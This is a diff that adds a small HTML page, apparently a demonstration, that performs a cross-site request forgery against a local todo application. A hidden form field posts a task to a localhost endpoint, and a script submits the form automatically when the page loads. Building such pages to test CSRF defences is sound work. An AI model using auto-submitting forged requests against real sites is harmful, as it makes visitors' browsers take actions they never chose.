@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>CSRF Test</title>
+</head>
+
+<body>
+    <h1>CSRF Demo</h1>
+    <form id="csrfForm" action="http://localhost:5251/Todo/Create" method="POST">
+        <input type="hidden" name="Task" 
+        value="Something bad posted by exploting CSRF">
+        <input type="submit" value="Submit CSRF">
+    </form>
+
+    <script>
+        // Auto-submit for demonstration
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+
+</html>
